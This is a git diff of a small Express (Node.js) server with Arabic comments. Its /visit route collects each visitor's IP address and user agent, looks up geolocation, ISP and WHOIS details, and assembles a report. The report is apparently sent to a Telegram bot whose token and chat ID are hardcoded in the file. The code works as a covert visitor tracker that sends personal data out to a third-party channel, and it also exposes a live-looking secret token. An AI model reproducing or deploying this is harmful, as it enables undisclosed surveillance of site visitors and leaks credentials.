@@ -1,14 +1,22 @@
+
+
+
+
+
+
+
+
 const express = require("express");
 const path = require("path");
 const app = express();
 
 app.use(express.json());
-// هذا السطر يضمن أن أي ملف (صورة، CSS، JS) في المجلد يتم التعرف عليه
-app.use(express.static(__dirname)); 
+app.use(express.static(__dirname)); // لضمان ظهور الصور في الموقع
 
 const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
 const TELEGRAM_CHAT_ID = "8059402181";
 
+// وظيفة جلب بيانات WHOIS العميقة
 async function getWhois(ip) {
   try {
     const res = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
@@ -28,9 +36,14 @@ app.post("/visit", async (req, res) => {
     const client = req.body;
     const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
     const ua = req.headers["user-agent"] || "unknown";
+
+    // جلب بيانات الموقع والـ ISP
     const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
     const geo = await geoRes.json();
+    
+    // جلب بيانات الشبكة (WHOIS)
     const whois = await getWhois(ip);
+
     const isMobile = /mobile|android|iphone|ipad/i.test(ua);
 
     const report = `
@@ -94,3 +107,8 @@ app.post("/visit", async (req, res) => {
 
 app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));
 app.listen(3000);
+
+
+
+
+
